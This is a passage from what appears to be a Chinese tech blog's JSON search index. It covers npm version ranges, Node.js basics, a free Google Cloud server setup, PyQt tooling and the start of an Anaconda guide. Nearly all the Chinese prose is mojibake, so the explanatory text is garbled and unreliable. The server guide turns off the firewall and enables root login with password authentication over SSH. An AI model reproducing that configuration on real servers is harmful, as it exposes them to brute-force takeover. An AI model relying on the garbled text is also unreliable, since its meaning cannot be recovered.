2.0.0\n\näº†è§£äº†æä¾›è€…çš„ç‰ˆæœ¬è§„èŒƒåï¼Œ npm åŒ…ä½¿ç”¨è€…å°±å¯ä»¥é’ˆå¯¹è‡ªå·±çš„éœ€è¦å¡«å†™ä¾èµ–åŒ…çš„ç‰ˆæœ¬è§„åˆ™ã€‚\n```\n\n\n\nä½œä¸ºä½¿ç”¨è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ package.json æ–‡ä»¶ä¸­å†™æ˜æˆ‘ä»¬å¯ä»¥æ¥å—è¿™ä¸ªåŒ…çš„æ›´æ–°ç¨‹åº¦ï¼ˆå‡è®¾å½“å‰ä¾èµ–çš„æ˜¯ 1.0.4 ç‰ˆæœ¬ï¼‰ï¼š\n\nå¦‚æœåªæ‰“ç®—æ¥å—è¡¥ä¸ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆä¹Ÿå°±æ˜¯æœ€åä¸€ä½çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n1.0\n1.0.x\n~1.0.4\n```\n\nå¦‚æœæ¥å—å°ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆç¬¬äºŒä½çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n1\n1.x\n^1.0.4\n```\n\nå¦‚æœå¯ä»¥æ¥å—å¤§ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆè‡ªç„¶æ¥å—å°ç‰ˆæœ¬å’Œè¡¥ä¸ç‰ˆæœ¬çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n*\nx\n```\n\n\nå°ç»“ä¸€ä¸‹ï¼šæ€»å…±ä¸‰ç§ç‰ˆæœ¬å˜åŒ–ç±»å‹ï¼Œæ¥å—ä¾èµ–åŒ…å“ªç§ç±»å‹çš„æ›´æ–°ï¼Œå°±æŠŠç‰ˆæœ¬å·å‡†ç¡®å†™åˆ°å‰ä¸€ä½ã€‚\n\n\n\n\n\n### 4. å…¶ä»–å®‰è£…çŸ¥è¯†\n\n\n\n#### 4.1 å®‰è£…å‚æ•° --save å’Œ --save -dev\n\næ·»åŠ ä¾èµ–æ—¶æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ package.json æ–‡ä»¶ï¼Œæ·»åŠ æˆ–è€…ä¿®æ”¹ dependencies devDependencies ä¸­çš„å†…å®¹å³å¯ã€‚å¦ä¸€ç§æ›´é…·çš„æ–¹å¼æ˜¯ç”¨å‘½ä»¤è¡Œï¼Œåœ¨ä½¿ç”¨ npm install æ—¶å¢åŠ  --save æˆ–è€… --save -dev åç¼€ï¼š\n\n```\nnpm install <package_name> --save è¡¨ç¤ºå°†è¿™ä¸ªåŒ…ååŠå¯¹åº”çš„ç‰ˆæœ¬æ·»åŠ åˆ° package.jsonçš„ dependencies\n\nnpm install <package_name> --save-dev è¡¨ç¤ºå°†è¿™ä¸ªåŒ…ååŠå¯¹åº”çš„ç‰ˆæœ¬æ·»åŠ åˆ° package.jsonçš„ devDependencies\n```\n\ndependenciesï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ç”¨åˆ°çš„ä¾èµ–\n\ndevDependenciesï¼šåœ¨å¼€å‘ã€æµ‹è¯•ç¯å¢ƒä¸­ç”¨åˆ°çš„ä¾èµ–\n\n\n\n#### 4.2 å…¨å±€å®‰è£… package\n\nå¦‚æœä½ æƒ³è¦ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨æŸä¸ªåŒ…ï¼Œæ¯”å¦‚ jshint ï¼Œä½ å¯ä»¥å…¨å±€å®‰è£…å®ƒã€‚å…¨å±€å®‰è£…æ¯”æœ¬åœ°å®‰è£…å¤šäº†ä¸ª -g:\n\n```\nnpm install -g <package-name>\n```\n\nå®‰è£…åå¯ä»¥ä½¿ç”¨ npm ls -g --depth=0 æŸ¥çœ‹å®‰è£…åœ¨å…¨å±€ç¬¬ä¸€å±‚çš„åŒ…ã€‚\n\n##### 4.2.1 å…¨å±€å®‰è£…çš„æƒé™é—®é¢˜\n\nåœ¨å…¨å±€å®‰è£…æ—¶å¯èƒ½ä¼šé‡åˆ° EACCES æƒé™é—®é¢˜, å¯ä»¥å¦‚ä¸‹è§£å†³ï¼š\n\n1.ä½¿ç”¨ sudo ç®€å•ç²—æš´ï¼Œä½†æ˜¯æ²»æ ‡ä¸æ²»æœ¬\n\n2.ä¿®æ”¹ npm å…¨å±€é»˜è®¤ç›®å½•çš„æƒé™\n\nå…ˆè·å– npm å…¨å±€ç›®å½•ï¼š`npm config get prefix`ï¼Œä¸€èˆ¬éƒ½æ˜¯ /usr/localï¼› ç„¶åä¿®æ”¹è¿™ä¸ªç›®å½•æƒé™ä¸ºå½“å‰ç”¨æˆ·ï¼š\n\n```shell\nsudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}\n```\n\n\n\n#### 4.3 package-lock.json\n\nåŸæ¥package.jsonæ–‡ä»¶åªèƒ½é”å®šå¤§ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ï¼Œå¹¶ä¸èƒ½é”å®šåé¢çš„å°ç‰ˆæœ¬ï¼Œä½ æ¯æ¬¡npm installéƒ½æ˜¯æ‹‰å–çš„è¯¥å¤§ç‰ˆæœ¬ä¸‹çš„æœ€æ–°çš„ç‰ˆæœ¬ï¼Œä¸ºäº†ç¨³å®šæ€§è€ƒè™‘æˆ‘ä»¬å‡ ä¹æ˜¯ä¸æ•¢éšæ„å‡çº§ä¾èµ–åŒ…çš„ï¼Œè¿™å°†å¯¼è‡´å¤šå‡ºæ¥å¾ˆå¤šå·¥ä½œé‡ï¼Œæµ‹è¯•/é€‚é…ç­‰ï¼Œæ‰€ä»¥package-lock.jsonæ–‡ä»¶å‡ºæ¥äº†ï¼Œå½“ä½ æ¯æ¬¡å®‰è£…ä¸€ä¸ªä¾èµ–çš„æ—¶å€™å°±é”å®šåœ¨ä½ å®‰è£…çš„è¿™ä¸ªç‰ˆæœ¬ã€‚\n\né‚£å¦‚æœæˆ‘ä»¬å®‰è£…æ—¶çš„åŒ…æœ‰bugï¼Œåé¢éœ€è¦æ›´æ–°æ€ä¹ˆåŠï¼Ÿ\n\n åœ¨ä»¥å‰å¯èƒ½å°±æ˜¯ç›´æ¥æ”¹package.jsoné‡Œé¢çš„ç‰ˆæœ¬ï¼Œç„¶åå†npm installäº†ï¼Œä½†æ˜¯5ç‰ˆæœ¬åå°±ä¸æ”¯æŒè¿™æ ·åšäº†ï¼Œå› ä¸ºç‰ˆæœ¬å·²ç»é”å®šåœ¨package-lock.jsoné‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½npm install xxx@x.x.x  è¿™æ ·å»æ›´æ–°æˆ‘ä»¬çš„ä¾èµ–ï¼Œç„¶åpackage-lock.jsonä¹Ÿèƒ½éšä¹‹æ›´æ–°ã€‚\n\n\n\n\n\n### å‚è€ƒèµ„æ–™:\n\nhttp://www.ruanyifeng.com/blog/2016/01/npm-install.html\n\nhttp://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\n\nhttps://blog.csdn.net/u011240877/article/details/76582670","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejsä»‹ç»å’Œjavascriptçš„åŒºåˆ«","url":"%2Fp%2F74d8b7c3.html","content":"\n### 1. nodejsçš„è¯ç”Ÿ\n\nè¯è¯´æœ‰ä¸ªå«Ryan Dahlçš„æ­ªæœä»ï¼Œä»–çš„å·¥ä½œæ˜¯ç”¨C/C++å†™é«˜æ€§èƒ½WebæœåŠ¡ã€‚å¯¹äºé«˜æ€§èƒ½ï¼Œå¼‚æ­¥IOã€äº‹ä»¶é©±åŠ¨æ˜¯åŸºæœ¬åŸåˆ™ï¼Œä½†æ˜¯ç”¨C/C++å†™å°±å¤ªç—›è‹¦äº†ã€‚äºæ˜¯è¿™ä½ä»å…„å¼€å§‹è®¾æƒ³ç”¨é«˜çº§è¯­è¨€å¼€å‘WebæœåŠ¡ã€‚ä»–è¯„ä¼°äº†å¾ˆå¤šç§é«˜çº§è¯­è¨€ï¼Œå‘ç°å¾ˆå¤šè¯­è¨€è™½ç„¶åŒæ—¶æä¾›äº†åŒæ­¥IOå’Œå¼‚æ­¥IOï¼Œä½†æ˜¯å¼€å‘äººå‘˜ä¸€æ—¦ç”¨äº†åŒæ­¥IOï¼Œä»–ä»¬å°±å†ä¹Ÿæ‡’å¾—å†™å¼‚æ­¥IOäº†ï¼Œæ‰€ä»¥ï¼Œæœ€ç»ˆï¼ŒRyanç„å‘äº†JavaScriptã€‚\n\nå› ä¸ºJavaScriptæ˜¯å•çº¿ç¨‹æ‰§è¡Œï¼Œæ ¹æœ¬ä¸èƒ½è¿›è¡ŒåŒæ­¥IOæ“ä½œï¼Œæ‰€ä»¥ï¼ŒJavaScriptçš„è¿™ä¸€â€œç¼ºé™·â€å¯¼è‡´äº†å®ƒåªèƒ½ä½¿ç”¨å¼‚æ­¥IOã€‚\n\né€‰å®šäº†å¼€å‘è¯­è¨€ï¼Œè¿˜è¦æœ‰è¿è¡Œæ—¶å¼•æ“ã€‚è¿™ä½ä»å…„æ›¾è€ƒè™‘è¿‡è‡ªå·±å†™ä¸€ä¸ªï¼Œä¸è¿‡æ˜æ™ºåœ°æ”¾å¼ƒäº†ï¼Œå› ä¸ºV8å°±æ˜¯å¼€æºçš„JavaScriptå¼•æ“ã€‚è®©GoogleæŠ•èµ„å»ä¼˜åŒ–V8ï¼Œå’±åªè´Ÿè´£æ”¹é€ ä¸€ä¸‹æ‹¿æ¥ç”¨ï¼Œè¿˜ä¸ç”¨ä»˜é’±ï¼Œè¿™ä¸ªä¹°å–å¾ˆåˆ’ç®—ã€‚\n\näºæ˜¯åœ¨2009å¹´ï¼ŒRyanæ­£å¼æ¨å‡ºäº†åŸºäºJavaScriptè¯­è¨€å’ŒV8å¼•æ“çš„å¼€æºWebæœåŠ¡å™¨é¡¹ç›®ï¼Œå‘½åä¸ºNode.jsã€‚è™½ç„¶åå­—å¾ˆåœŸï¼Œä½†æ˜¯ï¼ŒNodeç¬¬ä¸€æ¬¡æŠŠJavaScriptå¸¦å…¥åˆ°åç«¯æœåŠ¡å™¨å¼€å‘ï¼ŒåŠ ä¸Šä¸–ç•Œä¸Šå·²ç»æœ‰æ— æ•°çš„JavaScriptå¼€å‘äººå‘˜ï¼Œæ‰€ä»¥Nodeä¸€ä¸‹å­å°±ç«äº†èµ·æ¥ã€‚\n\n<!-- more -->\n\n>  åœ¨Nodeä¸Šè¿è¡Œçš„JavaScriptç›¸æ¯”å…¶ä»–åç«¯å¼€å‘è¯­è¨€æœ‰ä½•ä¼˜åŠ¿ï¼Ÿ\n\næœ€å¤§çš„ä¼˜åŠ¿æ˜¯å€ŸåŠ©JavaScriptå¤©ç”Ÿçš„äº‹ä»¶é©±åŠ¨æœºåˆ¶åŠ V8é«˜æ€§èƒ½å¼•æ“ï¼Œä½¿ç¼–å†™é«˜æ€§èƒ½WebæœåŠ¡è½»è€Œæ˜“ä¸¾ã€‚\n\nå…¶æ¬¡ï¼ŒJavaScriptè¯­è¨€æœ¬èº«æ˜¯å®Œå–„çš„å‡½æ•°å¼è¯­è¨€ï¼Œåœ¨å‰ç«¯å¼€å‘æ—¶ï¼Œå¼€å‘äººå‘˜å¾€å¾€å†™å¾—æ¯”è¾ƒéšæ„ï¼Œè®©äººæ„Ÿè§‰JavaScriptå°±æ˜¯ä¸ªâ€œç©å…·è¯­è¨€â€ã€‚ä½†æ˜¯ï¼Œåœ¨Nodeç¯å¢ƒä¸‹ï¼Œé€šè¿‡æ¨¡å—åŒ–çš„JavaScriptä»£ç ï¼ŒåŠ ä¸Šå‡½æ•°å¼ç¼–ç¨‹ï¼Œå¹¶ä¸”æ— éœ€è€ƒè™‘æµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨æœ€æ–°çš„ECMAScript 6æ ‡å‡†ï¼Œå¯ä»¥å®Œå…¨æ»¡è¶³å·¥ç¨‹ä¸Šçš„éœ€æ±‚ã€‚\n\n\n\n### 2. nodeJså’Œjavascriptçš„å¼‚åŒ\n\næˆ‘ç›¸ä¿¡å¾ˆå¤šå…¥å‘Nodejsçš„äººéƒ½æ˜¯å‰ç«¯è½¬è¿‡æ¥çš„ï¼Œä½†æ˜¯å±€é™äºå…¬å¸é¡¹ç›®ç”¨ä¸åˆ°Nodejsï¼Œåªèƒ½è‡ªå­¦ï¼Œæœ‰äº›é‡è¦ä¸”åŸºç¡€çš„ä¸œè¥¿å°±å¿½ç•¥äº†ã€‚\n\nå‰ç«¯çš„JavaScriptå…¶å®æ˜¯ç”±ECMAScriptã€DOMã€BOMç»„åˆè€Œæˆã€‚JavaScript=ECMAScript+DOM+BOMã€‚\n\n#### 2.1 javascriptï¼š\n\n- ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)\n- DOMï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰\n- BOMï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰\n\nä¸Šé¢æ˜¯JavaScriptçš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆNodejså‘¢ï¼Ÿ\n\n#### 2.2 nodejsï¼š\n\n- ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)\n- os(æ“ä½œç³»ç»Ÿ)\n- file(æ–‡ä»¶ç³»ç»Ÿ)\n- net(ç½‘ç»œç³»ç»Ÿ)\n- database(æ•°æ®åº“)\n\nåˆ†æï¼šå¾ˆå®¹æ˜“çœ‹å‡ºï¼Œå‰ç«¯å’Œåç«¯çš„jsç›¸åŒç‚¹å°±æ˜¯ï¼Œä»–ä»¬çš„è¯­è¨€åŸºç¡€éƒ½æ˜¯ECMAScriptï¼Œåªæ˜¯ä»–ä»¬æ‰€æ‰©å±•çš„ä¸œè¥¿ä¸åŒï¼Œå‰ç«¯éœ€è¦æ“ä½œé¡µé¢å…ƒç´ ï¼Œäºæ˜¯æ‰©å±•äº†DOMï¼Œä¹Ÿéœ€è¦æ“ä½œæµè§ˆå™¨ï¼Œäºæ˜¯å°±æ‰©å±•äº†BOMã€‚è€ŒæœåŠ¡ç«¯çš„jsåˆ™ä¹Ÿæ˜¯åŸºäºECMAScriptæ‰©å±•å‡ºäº†æœåŠ¡ç«¯æ‰€éœ€è¦çš„ä¸€äº›APIï¼Œç¨å¾®äº†è§£åå°çš„ç«¥é‹è‚¯å®šçŸ¥é“ï¼Œåå°è¯­éŸ³æœ‰æ“ä½œç³»ç»Ÿçš„èƒ½åŠ›ï¼Œäºæ˜¯æ‰©å±•osï¼Œéœ€è¦æœ‰æ“ä½œæ–‡ä»¶çš„èƒ½åŠ›ï¼Œäºæ˜¯æ‰©å±•å‡ºfileæ–‡ä»¶ç³»ç»Ÿã€éœ€è¦æ“ä½œç½‘ç»œï¼Œäºæ˜¯æ‰©å±•å‡ºnetç½‘ç»œç³»ç»Ÿï¼Œéœ€è¦æ“ä½œæ•°æ®ï¼Œäºæ˜¯è¦æ‰©å±•å‡ºdatabaseçš„èƒ½åŠ›ã€‚\n\nè¿™ä¹ˆä¸€å¯¹æ¯”ï¼Œç›¸ä¿¡å¾ˆå¤šå°ä¼™ä¼´å¯¹nodejsæ›´åŠ äº†è§£äº†ï¼ŒåŸæ¥å‰ç«¯å’ŒæœåŠ¡ç«¯çš„jså¦‚æ­¤ç›¸ä¼¼ï¼Œä»–ä»¬çš„åŸºç¡€æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯ç¯å¢ƒä¸åŒï¼Œå¯¼è‡´ä»–ä»¬æ‰©å±•å‡ºæ¥çš„ä¸œè¥¿ä¸åŒè€Œå·²ã€‚\n\n\n\n### 3. æ€»ç»“:\n\nåœ¨ecmascriptéƒ¨åˆ†nodeå’ŒJSå…¶å®æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚ä¸æ•°æ®ç±»å‹çš„å®šä¹‰ã€è¯­æ³•ç»“æ„ï¼Œå†…ç½®å¯¹è±¡ã€‚\n\nä¾‹å¦‚jsä¸­çš„é¡¶å±‚å¯¹è±¡æ˜¯windowå¯¹è±¡ï¼Œä½†æ˜¯åœ¨nodeä¸­æ²¡æœ‰ä»€ä¹ˆwindowå¯¹è±¡ï¼Œnodeä¸­çš„é¡¶å±‚å¯¹è±¡æ˜¯globalå¯¹è±¡ã€‚","tags":["nodejs"],"categories":["nodejs"]},{"title":"è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨","url":"%2Fp%2Fb7e5827a.html","content":"\nå‰ä¸¤å¹´æŠ˜è…¾è¿‡äºšé©¬é€Šçš„å…è´¹ä¸€å¹´awsï¼Œåæ¥å‘ç°é€Ÿåº¦å¾ˆæ…¢å°±å¼ƒç”¨äº†ã€‚ä¿—è¯è¯´å…è´¹çš„æ˜¯æœ€è´µçš„ï¼Œä½†æ˜¯googleæ³¨å†Œä¹‹åç›´æ¥ç»™300åˆ€ï¼Œè´§çœŸä»·å®çš„é’±å¯ä»¥ç”¨æ¥ä¹°æœåŠ¡å™¨ï¼Œç®€ç›´ä¸è¦å¤ªå¥½ç”¨ï¼\n\n> è§‚çœ‹1080pæ— å‹åŠ›\n\n<img src=\"è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨/3.png\" alt=\"1\" style=\"zoom: 67%;\" />\n\n<!-- more -->\n\n### 1. æ³¨å†Œå¹¶ç”³è¯·GCP\n\nhttps://console.cloud.google.com,  åœ¨æ³¨å†Œæ—¶å¡«å†™ä¸ªäººèµ„æ–™çš„æ—¶å€™éœ€è¦å¡«å†™visaä¿¡ç”¨å¡éªŒè¯,å¯ä»¥ç”¨è‡ªå·±çš„visaå¡(ä¼šæ‰£é™¤1ç¾åˆ€ä½†æ˜¯ä¼šè¿”å›, ä¸ªåˆ«é“¶è¡Œvisaå¡ä¸æ”¯æŒ), å½“ç„¶ä¹Ÿå¯ä»¥å»ä¸‡èƒ½çš„æŸå®è´­ä¹°ä¸€ä¸ªè™šæ‹Ÿçš„ä¿¡ç”¨å¡, ä»·å€¼åœ¨10å…ƒ-30å…ƒå·¦å³.\n\n### 2. åˆ›å»ºæœåŠ¡å™¨å®ä¾‹\n\nåœ¨GCPæ§åˆ¶ä¸­å¿ƒçš„` Compute Engine` çš„ VM å®ä¾‹é‡Œ, ç‚¹å‡»åˆ›å»ºå®ä¾‹. è¿™é‡Œæˆ‘é€‰ç”¨çš„æ˜¯Ubuntu 16.04, æœºå™¨ç±»å‹å…±äº«vCPUç§‘å­¦ä¸Šç½‘è¶³çŸ£.\n\n<img src=\"è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨/1.png\" alt=\"1\" style=\"zoom:33%;\" />\n\n\n\nåˆ›å»ºæˆåŠŸå,  å¯ä»¥é€šè¿‡ç½‘é¡µä¸Šçš„sshè¿æ¥è¿›å»ã€‚\n\n### 3. å®‰å…¨ç»„æ”¾å¼€, å›ºå®šIP\n\nç‚¹å‡»VMå®ä¾‹ -> å†…éƒ¨IP -> ä¸‹é¢çš„é“¾æ¥ è¿›å…¥VPCç½‘ç»œç®¡ç†\n\n<img src=\"è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨/2.png\" alt=\"1\" style=\"zoom: 33%;\" />\n\n\n\n\n\nåªåœ¨vpså†…å…³é—­é˜²ç«å¢™æ˜¯æ— æ•ˆçš„, è¿˜éœ€è¦åœ¨consleè®¾ç½®é˜²ç«å¢™è§„åˆ™. åœ¨`é˜²ç«å¢™è§„åˆ™`é‡Œåˆ›å»ºé˜²ç«å¢™è§„åˆ™, å¢åŠ è¦æ”¾è¡Œçš„ç«¯å£ã€‚\n\nå¦å¤–æœ€å¥½å›ºå®šä¸‹å¤–éƒ¨ipåœ°å€ï¼Œå¦åˆ™é‡å¯åipå˜äº†ä¼šéå¸¸çš„éº»çƒ¦ã€‚åœ¨`å¤–éƒ¨IPåœ°å€`é‡Œ, å¢åŠ å›ºå®šIPå³å¯ã€‚\n\n### 4. è®¾ç½®ç¬¬ä¸‰æ–¹sshç™»å½•\n\né€šè¿‡ç½‘é¡µçš„sshæ“ä½œå¾ˆéº»çƒ¦, æˆ‘ä»¬å¸Œæœ›ç›´æ¥é€šè¿‡ç»ˆç«¯ç›´æ¥è¿æ¥æœåŠ¡å™¨ã€‚\n\n```bash\n# 1. è®¾ç½®å¯†ç \nsudo passwd root #ç»™rootè®¾ç½®ä¸ªå¯†ç \nsudo ufw disable #ç¦æ­¢é˜²ç«å¢™, ç„¶å¹¶åµ, è¿˜éœ€è¦å»æ§åˆ¶ä¸­å¿ƒå¢åŠ é˜²ç«å¢™è§„åˆ™\n\n\n# 2. ä¿®æ”¹ssh é…ç½®ï¼Œssh-copy-idä¾èµ–å¯†ç \nsudo vi /etc/ssh/sshd_config \n\nPermitRootLogin yes\t\t\t\t\t# å…è®¸rootç™»å½•\nPasswordAuthentication yes  # å…è®¸å¯†ç ç™»å½•æ¡†\n\nsudo systemctl restart sshd # é‡å¯sshd\n\n\n# 3. æ‹·è´rootçš„å¯†é’¥\n\nssh-copy-id -i ~/.ssh/fhyx.pub root@34.96.227.178  # å¦‚æœæƒ³ç”¨ç§é’¥sshï¼Œæ¢æˆè‡ªå·±çš„ip\n```\n\n\n\n### 5. å®‰è£…moshå¹¶å¼€æœºå¯åŠ¨ï¼ˆå¯é€‰ï¼‰\n\nå®‰è£…mosh:\n\n```shell\nsudo apt install mosh\n\n# å®‰è£…åç›´æ¥æŠŠsshæ¢æˆmosh, è¿æ¥åä¼šå‘ç°é€Ÿåº¦å¿«å¾ˆå¤š.(éœ€è¦å¢åŠ é˜²ç«å¢™è§„åˆ™å…è®¸moshçš„ç«¯å£)\n```\n\n\n\nç¼–å†™`mosh-server` serviceæ–‡ä»¶:\n\n```shell\nsudo vi /etc/systemd/system/mosh-server.service\n\n\n[Unit]\nDescription=Mosh server\nAfter=network.target\n\n[Service]\nEnvironment=\"LC_ALL=en_US.UTF8\"\nExecStart=/usr/bin/mosh-server\nType=forking\n\n[Install]\nWantedBy=default.target\n```\n\n\n\nå¯åŠ¨å¹¶è®¾ç½®å¼€æœºå¯åŠ¨:\n\n```shell\nsudo systemctl daemon-reload\n\nsudo systemctl enable mosh-server\n\nsudo systemctl start mosh-server\n```\n\n\n\nå®¢æˆ·ç«¯ç›´æ¥ç”¨moshè¿æ¥å°±å¯ä»¥äº†, å¦‚æœæŠ¥é”™ `LC_CTYPE=UTF-8` çš„é—®é¢˜éœ€è¦åœ¨ä¸¤å°ç”µè„‘ä¸ŠåŠ ä¸Šç¯å¢ƒå˜é‡(.zshrc|.bashrc)\n\n```shell\nexport LC_ALL=en_US.UTF-8 \nexport LANG=en_US.UTF-8 \nexport LANGUAGE=en_US.UTF-8\n```\n","tags":["linux"],"categories":["æœåŠ¡å™¨"]},{"title":"pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹","url":"%2Fp%2Fa0594c46.html","content":"\n\n\næœ€è¿‘å‡†å¤‡å¼€å‘ä¸€ä¸ªGUIç¨‹åº, è€ƒå¯Ÿäº†ä¸€äº›èƒ½é€‰ç”¨çš„æŠ€æœ¯,  åœ¨windowsä¸‹æœ‰å¤šé—¨è¯­è¨€å¯ä»¥é€‰æ‹©(åŒ…æ‹¬æ˜“è¯­è¨€å“ˆå“ˆ). \n\nä½†æ˜¯æœ€åˆçš„æƒ³æ³•æ˜¯ä¸ä»…è¦å¿«æ·å¼€å‘è€Œä¸”æœ€å¥½è·¨å¹³å°, è·¨å¹³å°åŸºæœ¬æ²¡å¾—é€‰äº†åªèƒ½ç”¨qtäº†, ä½†çŸ­æ—¶é—´å†…ç”¨c++å¼€å‘è¿˜æ˜¯æ²¡æœ‰å‹‡æ°”çš„, äºæ˜¯ä¸¾æ£‹ä¸å®šé€‰python.\n\n\n\n### 1. ä¸‹è½½ qt designer\n\nå› ä¸º Qt Creatorå®åœ¨å¤ªå¤§äº†, é€‰ç”¨Qt Designer.ä¸‹è½½é“¾æ¥: https://build-system.fman.io/qt-designer-download\n\nå®‰è£…æˆåŠŸå, æœ€å¥½è®¾ç½®`Appearance`é‡Œä¸º `Dockerd Window`, è¦ä¸ç„¶å¾ˆåˆ«æ‰­\n\n<!-- more -->\n\n![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/1.png)\n\n\n\n### 2. ä¸‹è½½å®‰è£…pyqt\n\n```shell\nconda create --name pygui python=3.7   # å¼ºçƒˆå»ºè®®ä½¿ç”¨conda, åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒ\nconda activate pygui  # å¯ç”¨è™šæ‹Ÿç¯å¢ƒ\n\n\nconda install pip  # å®‰è£…pip\npip install PyQt5\npip install fbs            \npip install PyInstaller\n```\n\n\n\n### 3. pycharmé…ç½®QtDesignerå’ŒPyUIC\n\n+ é…ç½®conda\n\n  pycharm è®¾ç½® `Project Interpreter` ä¸º pyguiä¸‹çš„python\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/4.png)\n\n\n\n+ é…ç½®Qt Designer\n\n  Program:  ä½ çš„Qt Designerçš„è·¯å¾„\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/2.png)\n\n\n+ é…ç½®PyUIC\n\n  Program:   ä½ çš„pyuic5è·¯å¾„\n  Arguments:  `$FileName$ -o $FileNameWithoutExtension$.py`\n  Working directory:  `$FileDir$`\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/3.png)\n\n\n\n\n### 4. ä½¿ç”¨pyqt\n\n+ pyqtæ•™ç¨‹\n  http://zetcode.com/gui/pyqt5/    \n\n  **åº”è¯¥èŠ±è‡³å°‘ä¸€ä¸ªä¸‹åˆçš„æ—¶é—´å…ˆæ’¸ä¸€éè¿™ä¸ªæ•™ç¨‹**\n\n\n\n+ qt designeræ•™ç¨‹\n\n  https://doc-snapshots.qt.io/qt5-5.9/qtdesigner-manual.html\n\n  **åº”è¯¥èŠ±è‡³å°‘ä¸€ä¸ªä¸Šåˆçš„æ—¶é—´å…ˆæ’¸ä¸€éè¿™ä¸ªæ•™ç¨‹**\n\n  \n\n\n  ä½¿ç”¨qt designer è®¾è®¡ç¨‹åºå, ä¿å­˜ä¸º.uiæ–‡ä»¶.  ç„¶åç”¨pycharmçš„ External tools -> PyUIC ç”Ÿæˆ pyæ–‡ä»¶\n\n  åœ¨ç”Ÿæˆçš„pyä¸‹é¢åŠ å…¥è¿™äº›è¯, å¯ä»¥è¿è¡Œ\n\n  ```python\n  if __name__ == '__main__':\n      import sys\n      app = QtWidgets.QApplication(sys.argv)\n      MainWindow = QtWidgets.QMainWindow()\n      ui = Ui_MainWindow()\n      ui.setupUi(MainWindow)\n      MainWindow.show()\n      sys.exit(app.exec_())\n  ```\n\n\n\n### 5. æ‰“åŒ…å®‰è£…ç¨‹åº\n\nè¯·å‚è€ƒ: \n\n+ https://github.com/mherrmann/fbs\n+ https://github.com/mherrmann/fbs-tutorial\n\n\n\n### 6. pyqt5æ•™ç¨‹\n\n+ http://zetcode.com/gui/pyqt5/\n\n+ https://zhuanlan.zhihu.com/p/48373518","tags":["pyqt"],"categories":["python"]},{"title":"pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2F3c2948a5.html","content":"\n\n\nåœ¨Pythonä¸­ï¼Œå®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œæ˜¯é€šè¿‡åŒ…ç®¡ç†å·¥å…·pipå®Œæˆçš„ã€‚ç”¨pipä¸€ä¸ªä¸€ä¸ªå®‰è£…è´¹æ—¶è´¹åŠ›ï¼Œè¿˜éœ€è¦è€ƒè™‘å…¼å®¹æ€§ã€‚æˆ‘ä»¬æ¨èç›´æ¥ä½¿ç”¨[anaconda](https://www.anaconda.com/)ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºPythonçš„æ•°æ®å¤„ç†å’Œç§‘å­¦è®¡ç®—å¹³å°ï¼Œå®ƒå·²ç»å†…ç½®äº†è®¸å¤šéå¸¸æœ‰ç”¨çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæˆ‘ä»¬è£…ä¸ŠAnacondaï¼Œå°±ç›¸å½“äºæŠŠæ•°åä¸ªç¬¬ä¸‰æ–¹æ¨¡å—è‡ªåŠ¨å®‰è£…å¥½äº†ï¼Œéå¸¸ç®€å•æ˜“ç”¨ã€‚\n\n\n\nanaconda æ˜¯ä¸€ä¸ªç”¨äºç§‘å­¦è®¡ç®—çš„Pythonå‘è¡Œç‰ˆï¼Œæ”¯æŒ Linux, Mac, 